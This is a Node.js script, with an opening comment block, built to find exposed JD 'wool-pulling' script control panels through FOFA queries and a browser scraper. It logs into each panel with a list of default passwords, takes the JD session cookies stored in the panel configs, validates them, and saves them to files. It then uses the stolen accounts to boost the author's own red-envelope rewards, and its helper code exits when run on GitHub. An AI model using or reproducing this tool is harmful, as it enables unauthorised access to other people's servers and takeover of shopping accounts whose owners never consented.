/*
https://fofa.so/  
port="5678" && title=="控制面板"
port="5678" && title=="京东羊毛脚本控制面板"
port="5678" && title=="京东薅羊毛控制面板"
port="5678" && title=="JSTOOL控制面板"
port="5678" && title=="JDSHELL控制面板"
title=="jdc"
port="5700"


// 进阶版收集ip代码开始===============

let ipArr, ipList = [], curPage = 1, allPage, timeId;
function getIp () {
  window.scroll({top:document.body.clientHeight,left:0,behavior:'smooth' });
  let ipDomArr = document.getElementsByClassName('aSpan');
  let ipHtml = '';
  ipDomArr.forEach(ipDom => {
    ipHtml+=ipDom.innerHTML;
  })
  // ipArr = ipHtml.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?/g);
  ipArr = ipHtml.match(/https?:\/\/([^"|^<]+)/g).map(text => text.replace(/https?:\/\//,''));

  Array.prototype.push.apply(ipList, [...new Set(ipArr)]);
  if (curPage === allPage) console.log(ipList.join('\n'));
  getNext();
}
function getNext () {
  let curPageElm = document.getElementsByClassName('active');
  if (curPageElm[0]) {
    let pagesElm = curPageElm[0].parentNode.children;
    allPage = pagesElm.length > 5 ? 5 : pagesElm.length
    if (curPageElm[0].innerHTML == 5 || curPageElm[0].innerHTML == pagesElm.length) {
      observer.disconnect();
      return
    };
    for (let i = 0; i < 5; i++) {
      if (pagesElm[i].innerHTML == 1 + parseInt(curPageElm[0].innerHTML)) {
        curPage = parseInt(pagesElm[i].innerHTML);
        pagesElm[i].click();
        break;
      }
    }
  } else {
    console.log(ipList.join('\n'));
  }
}
let observer = new MutationObserver(function(mutationsList) {
  mutationsList.forEach(function(item,index){
    if (item.type == 'childList') {
      clearTimeout(timeId);
      timeId = setTimeout(() => {
        try {
          if (parseInt(document.getElementsByClassName('active')[0].innerHTML) === curPage) {
            getIp();
          }
        }catch(e){}
      },1000);
    }
  });
});
observer.observe(document.getElementsByClassName('mainRightContainer')[0], { childList: true });
getIp();

==========================结束

// 密码组合
[
  { username: "useradmin", password: "supermanito" },
  { username: 'admin', password: 'adminadmin' },
  { username: 'admin', password: 'admin' },
  { username: 'admin', password: 'shuye72' }
  { username: 'root', password: 'admin' },
  { username: 'root', password: 'password' }
]
*/

const $ = new Env('嫖ck');
let request = require('request');
let fs = require('fs');
fs.unlink("/jd/own/ck.txt",function(err){if(err){console.log(`unlink :${err}`);}});
fs.unlink("/jd/own/ck-dyj.txt",function(err){if(err){console.log(`unlink :${err}`);}});
fs.unlink("/jd/own/ck-simple.txt",function(err){if(err){console.log(`unlink :${err}`);}});
fs.unlink("/jd/own/stealResult.txt",function(err){if(err){console.log(`unlink :${err}`);}});
const ipStr = fs.readFileSync("/jd/own/ipArr.txt",function(err){if(err){console.log(`ipArr.txt :${err}`);}});
const ipArr = ipStr.toString().replace(/\r/g, '').split('\n');
let secretArr = [
  { username: "useradmin", password: "supermanito" },
  { username: 'admin', password: 'adminadmin' },
  { username: 'admin', password: 'admin' },
  { username: 'admin', password: 'shuye72' },
  { username: 'root', password: 'admin' },
  { username: 'root', password: 'password' }
]; 
let ckNum = 1;
const stealResult = [];
const ipArr2 = [...new Set(ipArr)]; // 筛选掉重复的
// 大赢家用
let dyjcookie = ''
let helps = []
let cookiesArr = []
// let pins = ["4166454-27251362", "xxhy1990", "jd_42e72a4a4801d", "uihcc"];
let pins = ["xxhy1990"];
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
// ============
// const multiThread = (list, limit, asyncHandle) => {
//   let recursion = (arr) => {
//     return asyncHandle(arr.shift())
//       .then(()=>{
//         if (arr.length!==0) return recursion(arr)   // 数组还未迭代完，递归继续进行迭代
//         else return 'finish';
//       })
//   };
  
//   let listCopy = [].concat(list);
//   let asyncList = []; // 正在进行的所有并发异步操作
//   while(limit--) {
//     asyncList.push( recursion(listCopy) ); 
//   }
//   return Promise.all(asyncList);  // 所有并发异步操作都完成后，本次并发控制迭代完成
// }
//{ err: 1, msg: '错误的用户名密码，请重试' }
!(async () => {
  await requireConfig()

  // ======== 大赢家 =======
  for (let i = 0; i < cookiesArr.length; i++) {
    dyjcookie = cookiesArr[i];
    pin = dyjcookie.match(/pt_pin=([^; ]+)(?=;?)/) && dyjcookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]
    if(pins && pins.indexOf(pin)!=-1){
      let dyjRes = await redEnvelopeInteractHome()
      let redEnvelopeId = dyjRes?.data?.redEnvelopeId
      let markedPin = dyjRes?.data?.markedPin
      helps.push({redEnvelopeId: redEnvelopeId, markedPin: markedPin})
    }
  }
  // ======== over =========
  
  for (let i = 0, len = ipArr2.length; i < len; i++) {
    let k = 0;
    let type = 'auth';
    if (!ipArr2[0]) break;
    if (!ipArr2[i]) continue;
    console.log(`扫描进度 ====== ${(i*100/len).toFixed(2)}%，当前ip：${ipArr2[i]}`);
    // 先检测jdc
    // $.res = await checkJdc(ipArr2[i])
    // if (Array.isArray($.res)) {
    //   let configStr = ''
    //   $.res.forEach(info => {
    //     configStr+=info.value
    //   })
    //   await checkCK(ipArr2[i], configStr)
    // } else {
      $.res = await checkAuth(ipArr2[i], secretArr[k]);
      if (!$.res) {
        type = 'login';
        $.res = await checkLogin(ipArr2[i], secretArr[k]);
      }
      if ($.res) {
        if ($.res.err === 1) { //可以连上，测试密码
          while (k < secretArr.length && $.res?.err === 1) {
            k++;
            if (!secretArr[k]){break;};
            type === 'auth' ? $.res = await checkAuth(ipArr2[i], secretArr[k]) : $.res = await checkLogin(ipArr2[i], secretArr[k]);
          }
        } else if ($.res.err === 0){
          continue;
        }
      }
    // }
    $.res = ''
  }
  // 多到少排序
  stealResult.sort((a, b) => (b.count - a.count));

  // 写入结果
  let descArr = [], validIp = [];
  stealResult.map(_r => {
    descArr.push(_r.desc);
    validIp.push(_r.ip);
  });
  fs.writeFile('/jd/own/stealResult.txt', descArr.concat(['\n'],validIp).join('\n'), function(err){if(err){console.log(`stealResult.txt :${err}`);}});
})().finally(() => $.done());


function requireConfig() {
  return new Promise(resolve => {
      const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
      if ($.isNode()) {
          Object.keys(jdCookieNode).forEach((item) => {
              if (jdCookieNode[item]) {
                  cookiesArr.push(jdCookieNode[item])
              }
          })
          if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
      } else {
          cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
      }
      resolve()
  })
}

function checkJdc(ip) {
  return new Promise((resolve) => {
    const options = {  
      timeout: 4000,
      url: `http://${ip}/checkcookie`
    };
    request.get(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`当前ip：${ip}, errjdc=${JSON.stringify(err)}`);
          resolve()
        } else {
          data = JSON.parse(data);
          resolve(data.data);
        }
      } catch (e) {
        // console.log(`当前ip：${ip}, catch jdc`);
        resolve();
      }
    },);
  });
}

function randomString(e) {
  e = e || 32;
  let t = "abcdefhijkmnprstwxyz2345678",
      a = t.length,
      n = "";
  for (i = 0; i < e; i++)
      n += t.charAt(Math.floor(Math.random() * a));
  return n
}

function checkAuth(ip,form) {
  return new Promise((resolve) => {
    const options = {  
      timeout: 4000,
      url: `http://${ip}/auth`,
      form: form,
    };
    request.post(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`当前ip：${ip}, err1=${JSON.stringify(err)}`);
          resolve()
        } else {
          let cookie = resp.headers['set-cookie'];
          data = JSON.parse(data);
          if (data.err !== 1) {
            await getConfig(ip, cookie, 'config', form);
          }
          resolve(data);
        }
      } catch (e) {
        console.log(`当前ip：${ip}, catch err1`);
        // $.logErr(e, resp);
        resolve();
      }
    },);
  });
}

function checkLogin(ip,form) {
  return new Promise((resolve) => {
    const options = {  
      timeout: 4000,
      url: `http://${ip}/login`,
      form: form,
    };
    request.post(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`当前ip：${ip}, err2=${JSON.stringify(err)}`);
          resolve()
        } else {
          let cookie = resp.headers['set-cookie'];
          data = JSON.parse(data);
          if (data.err !== 1) {
            await getConfig(ip, cookie, 'config', form);
          }
        }
      } catch (e) {
        console.log(`当前ip：${ip}, catch err2`);
        // $.logErr(e, resp);
        resolve();
      } finally {
        resolve(data);
      }
    },);
  });
}

function getConfig(ip, cookie, type = 'config', secret) {
  return new Promise((resolve) => {
    const options = {
      timeout: 4000,
      url: `http://${ip}/api/config/${type}?t=${new Date().getTime()}`,
      headers: {
        Cookie: cookie,
      },
    };
    $.get(options, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`);
          resolve()
        } else {
          let configStr = JSON.stringify(data).replace(/\s/g,"");
          await checkCK(ip, configStr, cookie, type, secret)
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve();
      }
    });
  });
}

async function checkCK (ip, configStr, cookie, type, secret) {
  if (!configStr) return false;
  let ckArrArr = configStr.match(/(pt_key=[^;]+;\s?pt_pin=[^(xxxx;);\\"]+;?)|(pt_pin=[^;]+;\s?pt_key=[^(xxxx;);\\"]+;?)/g);
  let ckArr = [];
  if (ckArrArr) {
    for (let ck of ckArrArr) {
      $.cookie = (/;$/.test(ck) ? ck : ck + ';');
      $.isLogin = true;
      await TotalBean();
      // console.log(`${ck} ===== ${$.isLogin}`)
      if (!$.isLogin) {
        continue;
      } else {
        ckArr.push(ck);
        fs.appendFileSync("/jd/own/ck-simple.txt", (/;$/.test(ck) ? ck : ck + ';') + "\n");
        fs.appendFileSync('/jd/own/ck.txt', 'Cookie' + ckNum + '="' + (/;$/.test(ck) ? ck : ck + ';') + '"\n');
        ckNum++;
        let jdyRes = await openRedEnvelopeInteract($.cookie, {redEnvelopeId: helps[0].redEnvelopeId,inviter: helps[0].markedPin, helpType:"1"})
        let errMsg = jdyRes?.data?.helpResult?.errMsg
        if(errMsg){
          // console.log(errMsg)
          fs.appendFileSync("/jd/own/ck-dyj.txt", $.cookie + "\n");
        }
      }
    }
    if (secret) {
      stealResult.push({ip, count: ckArr.length, desc: `【${ip}】 有效ck数：${ckArr.length}，账号：${secret.username}，密码：${secret.password}`});
      console.log(
        `【${ip}】 有效ck数：${ckArr.length}，账号：${secret.username}，密码：${secret.password}`
      );
    } else {
      stealResult.push({ip, count: ckArr.length, desc: `【${ip}】 有效ck数：${ckArr.length}，地址：${ip}/checkcookie`});
      console.log(
        `【${ip}】 有效ck数：${ckArr.length}，地址：${ip}/checkcookie`
      );
    }
  } else {
    // config文件没有ck，有可能ck在 userconfig 里
    if (type === 'config') await getConfig(ip, cookie, 'usrconfig', secret)
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
        "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
        "headers": {
            "Accept": "application/json,text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-cn",
            "Connection": "keep-alive",
            "Cookie": $.cookie,
            "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
            "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
        }
    }
    $.post(options, (err, resp, data) => {
        try {
            if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
                $.isLogin = false;
                resolve()
            } else {
                if (data) {
                    data = JSON.parse(data);
                    if (data['retcode'] === 13) {
                        $.isLogin = false; //cookie过期
                        // console.log('ck过期')
                        return
                    }
                } else {
                    console.log(`京东服务器返回空数据`)
                    $.isLogin = false;
                }
            }
        } catch (e) {
            $.logErr(e, resp)
        } finally {
            resolve();
        }
    })
})
}

function redEnvelopeInteractHome() {
  return new Promise(resolve => {
      $.get({
          url: "https://api.m.jd.com/?functionId=redEnvelopeInteractHome&body={%22linkId%22:%22yMVR-_QKRd2Mq27xguJG-w%22,%22redEnvelopeId%22:%22%22,%22inviter%22:%22%22,%22helpType%22:%22%22}&t=" + Date.now() + "&appid=activities_platform&clientVersion=3.5.6",
          headers: {
              'Cookie': dyjcookie,
              'Accept': '*/*',
              'Connection': 'keep-alive',
              'Accept-Encoding': 'gzip, deflate, br',
              'User-Agent': ua,
              'Accept-Language': 'zh-Hans-CN;q=1',
              'Host': 'api.m.jd.com',
              'Origin': 'https://wbbny.m.jd.com'
          },
      }, (err, resp, data) => {
          try {
              data = JSON.parse(data)
              if(data.data){
                console.log(data.data.bizMsg)
              }
              if(data.errorMessage){
                console.log(data.errorMessage)
            }
          } catch (e) {
              $.logErr('Error: ', e, resp)
          } finally {
              resolve(data)
          }
      })
  })
}

function openRedEnvelopeInteract(cookie, body = {}) {
  body.linkId = "yMVR-_QKRd2Mq27xguJG-w"
  return new Promise(resolve => {
      $.get({
          url: "https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body="+JSON.stringify(body)+"&t=" + Date.now() + "&appid=activities_platform&clientVersion=3.5.6",
          headers: {
              'Cookie': cookie,
              'Accept': '*/*',
              'Connection': 'keep-alive',
              'Accept-Encoding': 'gzip, deflate, br',
              'User-Agent': ua,
              'Accept-Language': 'zh-Hans-CN;q=1',
              'Host': 'api.m.jd.com',
              'Origin': 'https://wbbny.m.jd.com'
          },
      }, (err, resp, data) => {
          try {
              data = JSON.parse(data)
          } catch (e) {
              $.logErr('Error: ', e, resp)
          } finally {
              resolve(data)
          }
      })
  })
}


// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}